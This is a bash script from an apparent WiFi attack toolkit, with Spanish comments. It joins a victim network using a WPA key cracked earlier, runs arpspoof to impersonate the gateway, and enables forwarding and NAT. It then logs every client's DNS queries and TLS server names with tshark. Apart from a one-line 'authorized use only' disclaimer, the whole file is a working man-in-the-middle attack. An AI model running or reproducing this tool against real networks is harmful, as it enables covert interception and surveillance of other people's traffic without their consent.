#!/bin/bash
# Pineapple Express - MITM activo: conecta wlan1 al AP víctima, ARP spoof, captura DNS/SNI
# Lee target de /opt/pinacola/mitm-ready (escrito por wifitest.sh tras crackear)
# USE ONLY on networks you OWN or are AUTHORIZED to test.
FEED=/opt/pinacola/mitm-feed.log
STATE=/opt/pinacola/mitm-attack.state
READY=/opt/pinacola/mitm-ready

ts(){ date +%H:%M:%S; }
log(){ echo "[$(ts)] $*" >> "$FEED"; tail -200 "$FEED" > "$FEED.tmp" && mv "$FEED.tmp" "$FEED"; }

[ ! -f "$READY" ] && { echo "stopped:no-target" > "$STATE"; exit 1; }
. "$READY"   # carga BSSID, KEY, SSID, CHANNEL
[ -z "$BSSID" ] || [ -z "$KEY" ] && { echo "stopped:no-key" > "$STATE"; exit 1; }

echo "starting" > "$STATE"

cleanup() {
  pkill -f 'arpspoof' 2>/dev/null
  pkill -f 'tshark.*wlan1' 2>/dev/null
  nmcli con delete mitm-target 2>/dev/null
  nmcli dev set wlan1 managed no 2>/dev/null
  ip link set wlan1 down 2>/dev/null
  iw dev wlan1 set type monitor 2>/dev/null
  ip link set wlan1 up 2>/dev/null
  echo "stopped" > "$STATE"
  systemctl start kismet-sensor.service 2>/dev/null
}
trap cleanup EXIT

# liberar wlan1 de Kismet
systemctl stop kismet-sensor.service 2>/dev/null
pkill -9 -f 'kismet_cap_linux_wifi' 2>/dev/null
sleep 1

# wlan1 a managed mode
nmcli dev set wlan1 managed yes 2>/dev/null
ip link set wlan1 down
iw dev wlan1 set type managed
ip link set wlan1 up
sleep 0.5

: > "$FEED"
log "Conectando a '$SSID' ($BSSID) con key '$KEY'..."

# crear perfil NM y conectar
nmcli con delete mitm-target 2>/dev/null
nmcli con add type wifi ifname wlan1 con-name mitm-target \
  ssid "$SSID" \
  802-11-wireless.bssid "$BSSID" \
  wifi-sec.key-mgmt wpa-psk \
  wifi-sec.psk "$KEY" 2>/tmp/mitm-nm.log
nmcli con up mitm-target ifname wlan1 2>>/tmp/mitm-nm.log
sleep 6

WLAN1_IP=$(ip -4 addr show wlan1 | awk '/inet /{gsub(/\/.*/, "", $2); print $2}' | head -1)
GW=$(ip route show dev wlan1 | awk '/default/{print $3}' | head -1)

if [ -z "$WLAN1_IP" ] || [ -z "$GW" ]; then
  NM_ERR=$(tail -2 /tmp/mitm-nm.log 2>/dev/null | tr '\n' ' ')
  log "X Conexion fallida. IP=${WLAN1_IP:-?} GW=${GW:-?}. $NM_ERR"
  echo "stopped:error" > "$STATE"
  exit 1
fi

log "Conectado | IP $WLAN1_IP | GW $GW | Kismet pausado"
echo "running" > "$STATE"

sysctl -w net.ipv4.ip_forward=1 >/dev/null
iptables -t nat -A POSTROUTING -o wlan1 -j MASQUERADE 2>/dev/null

# ARP spoof: decir a todos los clientes "yo soy el gateway"
if command -v arpspoof >/dev/null 2>&1; then
  log "ARP spoof activo -> interceptando trafico de clientes hacia $GW..."
  arpspoof -i wlan1 "$GW" >/dev/null 2>&1 &
  sleep 1
else
  log "arpspoof no disponible (apt install dsniff) - captura solo pasiva"
fi

# tshark: DNS + TLS SNI en wlan1
log "Capturando DNS/HTTPS..."
tshark -i wlan1 -l \
  -Y "tls.handshake.type==1 || dns.flags.response==0" \
  -T fields \
  -e ip.src -e tls.handshake.extensions_server_name -e dns.qry.name \
  2>/dev/null | while IFS=$'\t' read -r src sni dns; do
    src="${src%%,*}"
    [ "$src" = "$WLAN1_IP" ] && continue
    [ -n "$sni" ] && echo "$(date +%H:%M:%S)  $src -> $sni [TLS]" >> "$FEED"
    [ -n "$dns" ] && echo "$(date +%H:%M:%S)  $src -> $dns [DNS]" >> "$FEED"
    tail -200 "$FEED" > "$FEED.tmp" && mv "$FEED.tmp" "$FEED"
done
